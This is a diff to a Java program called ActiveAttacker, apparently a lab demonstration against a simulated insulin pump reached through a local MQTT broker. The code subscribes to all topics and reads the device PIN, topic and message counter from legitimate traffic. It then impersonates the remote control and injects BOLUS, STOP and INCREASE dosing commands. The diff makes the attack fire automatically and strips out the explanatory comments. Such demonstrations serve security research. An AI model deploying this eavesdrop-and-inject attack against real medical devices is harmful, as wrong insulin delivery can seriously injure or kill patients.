@@ -8,10 +8,10 @@ public class ActiveAttacker {
     private static final String BROKER = "tcp://localhost:1883";
     private static final String ATTACKER_ID = "ActiveAttacker";
 
-    // These are learned from passive eavesdropping
     private static String learnedTopic = null;
     private static UUID learnedPin = null;
     private static int learnedCounter = 0;
+    private static boolean attackLaunched = false;
 
     public static void main(String[] args) throws MqttException, InterruptedException {
 
@@ -20,62 +20,67 @@ public class ActiveAttacker {
         options.setCleanSession(true);
         client.connect(options);
 
-        System.out.println("[ATTACKER] Connected to broker. Listening for messages...");
+        System.out.println("[ATTACKER] Connected to broker.");
+        System.out.println("[ATTACKER] Listening for legitimate traffic...");
 
-        // Step 1: Passive phase — eavesdrop to learn PIN, topic, and counter
         client.subscribe("#", (topic, mqttMessage) -> {
             String raw = new String(mqttMessage.getPayload());
-            System.out.println("[ATTACKER] Intercepted on topic '" + topic + "': " + raw);
 
             try {
                 Message msg = Message.deserialize(raw);
 
-                // Validate CRC — only trust well-formed messages
                 if (!msg.isValid()) {
-                    System.out.println("[ATTACKER] Invalid CRC, ignoring.");
                     return;
                 }
 
-                // Learn the PIN and counter from legitimate traffic
                 learnedPin = msg.devicePin;
                 learnedCounter = msg.counter + 1;
                 learnedTopic = topic;
 
-                System.out.println("[ATTACKER] Learned PIN: " + learnedPin);
-                System.out.println("[ATTACKER] Learned topic: " + learnedTopic);
+                System.out.println("====================");
+                System.out.println("[INTERCEPTED]");
+                System.out.println("TOPIC: " + topic);
+                System.out.println("PAYLOAD: " + raw);
+                System.out.println("====================");
+
+                if (learnedPin != null && learnedTopic != null && !attackLaunched) {
+                    attackLaunched = true;
+                    new Thread(() -> {
+                        try {
+                            Thread.sleep(1000);
+                            System.out.println("====================");
+                            System.out.println("[ATTACKER] PIN learned: " + learnedPin);
+                            System.out.println("[ATTACKER] Launching active attack on topic: " + learnedTopic);
+                            System.out.println("====================");
+                            launchAttack(client, "BOLUS");
+                            Thread.sleep(1000);
+                            launchAttack(client, "STOP");
+                            Thread.sleep(1000);
+                            launchAttack(client, "INCREASE");
+                            System.out.println("====================");
+                            System.out.println("[ATTACKER] Attack complete. Disconnected.");
+                            System.out.println("====================");
+                            client.disconnect();
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
+                    }).start();
+                }
 
             } catch (Exception e) {
-                System.out.println("[ATTACKER] Could not parse message: " + e.getMessage());
+                // silently ignore unparseable messages
             }
         });
 
-        // Wait to collect legitimate traffic
-        Thread.sleep(5000);
-
-        // Step 2: Active phase — inject malicious command using learned PIN
-        if (learnedPin == null || learnedTopic == null) {
-            System.out.println("[ATTACKER] No legitimate traffic intercepted yet. Exiting.");
-            client.disconnect();
-            return;
+        while (!attackLaunched || client.isConnected()) {
+            Thread.sleep(500);
         }
-
-        System.out.println("[ATTACKER] Launching active attack...");
-        launchAttack(client, "BOLUS");   // immediate bolus injection
-        Thread.sleep(1000);
-        launchAttack(client, "STOP");    // stop insulin delivery
-        Thread.sleep(1000);
-        launchAttack(client, "INCREASE"); // increase dosage
-
-        client.disconnect();
-        System.out.println("[ATTACKER] Attack complete. Disconnected.");
     }
 
     private static void launchAttack(MqttClient client, String command) throws MqttException {
-        // Craft a malicious message using the learned PIN — pump cannot distinguish this
-        // from a legitimate remote control message
         Message malicious = new Message(
-            "remote",       // impersonate the remote control
-            learnedPin,     // use the eavesdropped PIN
+            "remote",
+            learnedPin,
             "command",
             command,
             learnedCounter++
@@ -86,6 +91,11 @@ public class ActiveAttacker {
         mqttMessage.setQos(1);
 
         client.publish(learnedTopic, mqttMessage);
-        System.out.println("[ATTACKER] Sent malicious command '" + command + "' to topic: " + learnedTopic);
+
+        System.out.println("====================");
+        System.out.println("[INJECTED]");
+        System.out.println("TOPIC: " + learnedTopic);
+        System.out.println("PAYLOAD: " + serialized);
+        System.out.println("====================");
     }
 }
